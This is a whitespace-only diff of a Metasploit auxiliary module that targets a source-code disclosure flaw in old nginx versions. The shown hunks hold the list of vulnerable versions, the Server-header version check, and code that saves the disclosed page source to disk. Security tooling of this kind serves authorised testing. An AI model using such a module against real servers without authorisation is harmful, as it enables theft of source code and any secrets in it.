@@ -54,12 +54,12 @@ class Metasploit3 < Msf::Auxiliary
 		uri = datastore['URI']
 		path_save = datastore['PATH_SAVE']
 
-		vuln_versions = [ 
+		vuln_versions = [
 			"nginx/0.7.56","nginx/0.7.58","nginx/0.7.59",
 			"nginx/0.7.60","nginx/0.7.61","nginx/0.7.62",
 			"nginx/0.7.63","nginx/0.7.64","nginx/0.7.65",
 			"nginx/0.8.33","nginx/0.8.34","nginx/0.8.35",
-			"nginx/0.8.36","nginx/0.8.37","nginx/0.8.38",	
+			"nginx/0.8.36","nginx/0.8.37","nginx/0.8.38",
 			"nginx/0.8.39","nginx/0.8.40"
 		]
 
@@ -73,12 +73,12 @@ class Metasploit3 < Msf::Auxiliary
 
 			version = res.headers['Server'] if res
 
-			if vuln_versions.include?(version)	
+			if vuln_versions.include?(version)
 				print_good("#{target_url} - nginx - Vulnerable version: #{version}")
 
 				if (res and res.code == 200)
 
-					print_good("#{target_url} - nginx - Getting the source of page #{uri}")				
+					print_good("#{target_url} - nginx - Getting the source of page #{uri}")
 
 					save_source = File.new("#{path_save}#{uri}","w")
 					save_source.puts(res.body.to_s)
@@ -94,9 +94,9 @@ class Metasploit3 < Msf::Auxiliary
 
 			else
 				if version =~ /nginx/
-					print_error("#{target_url} - nginx - Cannot exploit: the remote server is not vulnerable - Version #{version}")			
+					print_error("#{target_url} - nginx - Cannot exploit: the remote server is not vulnerable - Version #{version}")
 				else
-					print_error("#{target_url} - nginx - Cannot exploit: the remote server is not ngnix")			
+					print_error("#{target_url} - nginx - Cannot exploit: the remote server is not ngnix")
 				end
 				return
 
